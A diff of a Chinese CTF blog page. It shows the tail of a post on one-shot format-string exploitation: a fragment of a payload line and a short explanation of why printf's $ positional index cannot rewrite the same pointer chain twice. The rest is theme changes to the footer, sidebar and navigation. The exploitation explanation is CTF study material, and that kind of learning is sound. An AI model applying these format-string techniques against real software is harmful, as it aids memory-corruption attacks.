class="line"></span><br></pre></td></tr></table></figure>
 
 
 
@@ -361,22 +162,151 @@ payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">
 <p>有群u在群里请教了为什么不能用$符号定位使用两次，然后在一条链子上改两次，我在上面的das签到题里面有了些自己的测试，不过还是不如群里的大佬理解得透彻。</p>
 <p>自己整理了一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/9man/p/18228214">.N1nEmAn</a>师傅所说的原理：打格式化字符串时，使用$符号作为索引，会将栈的上下文保存到堆上，第一次使用$符号修改目标能正常修改栈上数据，但是堆上的数据没有变，而下次再使用$符号作为索引，会到堆里面去进行修改，而不是在栈上直接修改。这就是为什么不能在同一条链子上改两次。后面也有<a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">WJH</a>师傅贴出的博客，里面是WJH师傅对printf的源码分析。这就是与大佬们学习的差距吗，再接再厉！</p>
 </blockquote>
-</main>
 
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://tw11ty.github.io/2024/06/08/%E4%B8%80%E6%AC%A1%E6%80%A7%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8/" data-id="cm1apfr7d000f0sjwa9ur1866" data-title="一次性格式化字符串利用" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fmt/" rel="tag">fmt</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/06/10/the-end/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          the_end
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/06/06/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hello World</div>
+    </a>
+  
+</nav>
+
+  
 </article>
 
 
-<script src="/js/highlight.js"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    
 
-  </main>
-  <footer class="footer">
   
-  <span>Copyright © 2024 typo</span>
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO/" rel="tag">IO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arm/" rel="tag">arm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ciscn/" rel="tag">ciscn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-IO/" rel="tag">exit &amp; IO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmt/" rel="tag">fmt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writewp/" rel="tag">writewp</a></li></ul>
+    </div>
+  </div>
+
+
   
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/IO/" style="font-size: 10px;">IO</a> <a href="/tags/IOT/" style="font-size: 10px;">IOT</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/ciscn/" style="font-size: 10px;">ciscn</a> <a href="/tags/exit-IO/" style="font-size: 10px;">exit & IO</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/writewp/" style="font-size: 20px;">writewp</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">June 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/07/15/WKCTF-pwn/">WKCTF-pwn</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/">arm-pwn入门</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/">2024春秋杯夏季赛pwn</a>
+          </li>
+        
+          <li>
+            <a href="/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/">Iot-vulhub复现</a>
+          </li>
+        
+          <li>
+            <a href="/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/">2024ciscn分区赛-pwn复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 tw11ty<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
 </footer>
+
+    </div>
+    <nav id="mobile-nav">
   
-<script src="/js/theme.js"></script>
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
 
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
 </body>
-
 </html>
